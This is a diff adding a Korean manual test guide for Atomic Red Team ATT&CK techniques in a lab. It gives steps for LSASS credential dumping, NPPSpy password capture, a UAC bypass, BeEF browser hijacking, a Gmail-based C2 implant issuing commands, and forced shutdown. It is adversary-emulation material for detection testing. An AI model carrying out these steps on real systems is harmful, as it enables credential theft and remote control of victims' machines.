@@ -1,0 +1,144 @@
+자동 스크립트로 테스트 진행하기 어려운 항목들을 따로 모은 수동 테스트 가이드입니다. 
+각 항목별로 Step에 맞춰 테스트를 진행 해주세요.
+
+#------------------------------------------------------------
+# User Excution - Malicious Link (T1204.001A)
+# Atomic Test #1 - Malicious Link
+#------------------------------------------------------------
+
+Step 1. outlook을 실행
+Step 2. 임시 보관함에 있는 악성 링크를 클릭.
+
+#------------------------------------------------------------
+# Credential Access - Network Sniffing (T1040)
+# Atomic Test #4 - Windows Internal Packet Capture 
+#------------------------------------------------------------
+
+Step 1. 다음 항목을 Powershell 관리자 권한으로 실행 
+invoke-atomictest T1040 -testnumber 4 -ExecutionLogPath $ExecutionLogPath 
+invoke-atomictest T1040 -testnumber 4 -Cleanup -ExecutionLogPath $ExecutionLogPath -TimeoutSeconds 60 #프로그램 실행 후 50초 Timeout 발생
+
+#------------------------------------------------------------
+# Credential Access - OS Credential Dumping(T1003) 
+# Atomic Test #1 - LSASS Memory
+#------------------------------------------------------------
+
+Step 1. 작업 관리자 실행:
+ CTRL-ALT-DEL 또는 태스크바에서 우클릭하여 작업관리자 실행
+ 
+Step 2. lsass.exe 선택: 
+ lsass.exe가 보이지 않을 경우, 세부 정보에서 확인
+ 
+Step 3. lsass.exe 프로세스 우클릭하여 create dump file:
+ 덤프 파일 생성시 다이얼로그에 나타난 경로에 덤프파일 저장됨
+ 
+#------------------------------------------------------------
+# Credential Access - OS Credential Dumping(T1003)
+# Atomic Test #2 - Credential Dumping with NPPSpy
+#------------------------------------------------------------
+
+Step 1. 다음 항목을 Powershell 관리자 권한으로 실행
+invoke-atomictest T1003 -testnumber 2 -GetPrereqs -ExecutionLogPath $ExecutionLogPath 
+invoke-atomictest T1003 -testnumber 2 -ExecutionLogPath $ExecutionLogPath 
+
+Step 2. 윈도우 계정 로그아웃 후 로그인 하면, C:\NPPSpy.txt 파일이 생성됨
+
+Step 3. 다음 항목을 Powershell 관리자 권한으로 실행
+invoke-atomictest T1003 -testnumber 2 -Cleanup -ExecutionLogPath $ExecutionLogPath 
+
+#------------------------------------------------------------
+# Lateral Movement - Remote Services(T1021.002A) 
+# Atomic Test #1 - SMB/Windows Admin Shares
+#------------------------------------------------------------
+
+Step 1. 탐색기 실행
+Step 2. 네트워크 탭에서 다른 시스템의 공유 폴더 탐색
+
+#------------------------------------------------------------
+# Privilege Escalation - Abuse Elevation Control Mechanism(T1548) 
+# Atomic Test #2 - Bypass User Account Control
+#------------------------------------------------------------
+
+Step 1. 다음 항목을 Powershell로 실행 - Powershell이 종료됨
+invoke-atomictest T1548.002 -testnumber 9 -ExecutionLogPath $ExecutionLogPath 
+
+#------------------------------------------------------------
+# Collection - Screen Capture - T1113 - Screen Capture
+# Atomic Test #5 - Windows Screencapture
+#------------------------------------------------------------
+
+Step 1. 다음 항목을 Powershell로 실행
+invoke-atomictest T1113 -testnumber 5 -ExecutionLogPath $ExecutionLogPath 
+
+Step 2. 다음 항목을 Powershell로 실행 후 엔터 키 입력
+invoke-atomictest T1113 -testnumber 5 -Cleanup -ExecutionLogPath $ExecutionLogPath 
+
+#------------------------------------------------------------
+# Collection - Man in the Browser(T1185A) 
+# Atomic Test #1 - Man in the Browser
+#------------------------------------------------------------
+Step 1. 공격자 서버 실행(id: kali / pw: kali)
+
+Step 2. sudo su 
+Step 3. 쉘 실행 후 beef 폴더로 이동
+ cd /home/kali/Desktop/beef/beef
+
+Step 4. beef 실행 
+ ./beef
+ 
+Step 5. 클라이언트 PC에서 IE를 사용하여 beef URL 접속 
+ http://192.168.1.129:3000/demos/basic.html
+
+Step 6. 공격자 서버(Linux)에서 beef 패널 접속 
+ http://127.0.0.1:3000/ui/authentication (id: beef1 / pw:beef1)
+
+Step 7. 연결된 클라이언트 클릭(192.168.1.10) - 오른쪽 패널에서 proxy 클릭 - forge Request에서 아래와 같이 입력
+GET / HTTP/1.1 
+Host: www.naver.com
+
+Step 8. send 클릭
+
+Step 9. history 탭에서 요청이 정상적으로 요청됐는지 확인 
+
+#------------------------------------------------------------
+#Command and Control - Web Service: Bidirectional Communication(T1102.002A)
+# Atomic Test #1 - C2 using gmail
+#------------------------------------------------------------
+
+Step 1. 클라이언트(Windows10)에서 cmd 실행 
+
+Step 2. cd C:\Users\USER.CONTOSO\Desktop
+
+Step 3. implant 실행 (python2로 실행해야 함)
+  python implant.py
+
+Step 4. 공격자서버(kali Linux)에서 gcat 폴더로 이동
+  cd /home/kali/Desktop/gcat/gcat-master
+  
+Step 5. 클라이언트 확인 
+  python gcat.py -list     
+
+Step 6. 클라이언트 id를 넣고 ipconfig 명령 실행
+  python gcat.py -id <id> -cmd 'ipconfig'
+
+Step 7. 위 명령 실행 후 출력되는 jobid를 아래 명령어에 넣어 확인
+  python gcat.py -id <id> -jobid <jobid>
+
+#------------------------------------------------------------
+# Impact - System Shutdown/Reboot(T1529) T1529 - System Shutdown/Reboot
+# Atomic Test #1 - Shutdown System - Windows
+#------------------------------------------------------------
+
+Step 1. 다음 항목을 Powershell 관리자 권한으로 실행 - 시스템 종료
+invoke-atomictest T1529 -testnumber 1 -ExecutionLogPath $ExecutionLogPath 
+
+
+#------------------------------------------------------------
+# Impact - System Shutdown/Reboot(T1529) T1529 
+# Atomic Test #2 - Restart System - Windows
+#------------------------------------------------------------
+
+Step 1. 다음 항목을 Powershell 관리자 권한으로 실행 - 시스템 재시작
+invoke-atomictest T1529 -testnumber 2 -ExecutionLogPath $ExecutionLogPath
+
+
